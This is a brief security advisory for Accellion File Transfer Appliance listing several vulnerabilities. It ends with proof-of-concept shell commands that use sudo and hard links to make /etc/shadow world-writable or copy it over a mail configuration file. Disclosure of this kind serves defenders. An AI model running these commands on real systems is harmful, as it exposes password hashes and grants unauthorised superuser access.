Accellion File Transfer Appliance is prone to multiple remote vulnerabilities, including:

- Multiple privilege-escalation issues
- A directory-traversal issue
- An HTML-injection issue
- A remote command-injection issue

An attacker may leverage these issues to execute arbitrary script code within the context of the webserver, steal cookie-based authentication credentials, obtain sensitive information, and execute arbitrary code or commands with superuser privileges. Other attacks are also possible.

The following proofs of concept are available:

sh-2.05b$ ln /etc/shadow /home/admin/oldtemp
sh-2.05b$ sudo /bin/chmod 666 /home/admin/oldtemp

sh-2.05b$ ln /etc/shadow /home/admin/temp
sh-2.05b$ sudo /bin/cp /home/admin/temp /etc/mail/sendmail.cf

sh-2.05b$ sudo /usr/local/bin/admin.pl
